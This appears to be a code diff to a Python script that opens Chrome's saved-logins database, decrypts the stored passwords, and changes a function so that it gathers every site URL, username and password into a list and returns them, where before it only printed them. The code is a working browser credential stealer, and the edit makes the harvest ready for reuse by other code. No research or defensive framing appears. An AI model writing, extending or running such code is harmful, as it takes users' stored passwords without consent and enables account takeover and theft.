@@ -47,7 +47,7 @@ def decrypt_password(password, key):
             return ""
 
 
-def fetch():
+def FetchAccounts():
     # get the AES key
     key = get_encryption_key()
     # local sqlite Chrome database path
@@ -63,25 +63,14 @@ def fetch():
     # `logins` table has the data we need
     cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
     # iterate over all rows
+    accounts = []
     for row in cursor.fetchall():
         origin_url = row[0]
         action_url = row[1]
         username = row[2]
         password = decrypt_password(row[3], key)
-        date_created = row[4]
-        date_last_used = row[5]        
-       #if username or password:
-       #     print(f"Origin URL: {origin_url}")
-       #     print(f"Action URL: {action_url}")
-       #     print(f"Username: {username}")
-       #     print(f"Password: {password}")
-       # else:
-       #     continue
-       # if date_created != 86400000000 and date_created:
-      #      print(f"Creation date: {str(get_chrome_datetime(date_created))}")
-      #  if date_last_used != 86400000000 and date_last_used:
-      #      print(f"Last Used: {str(get_chrome_datetime(date_last_used))}")
-      #  print("="*50)
+        ac = ( origin_url, action_url, username, password ) 
+        accounts.append(ac)
     
     cursor.close()
     db.close()
@@ -90,3 +79,4 @@ def fetch():
         os.remove(filename)
     except:
          pass
+    return accounts
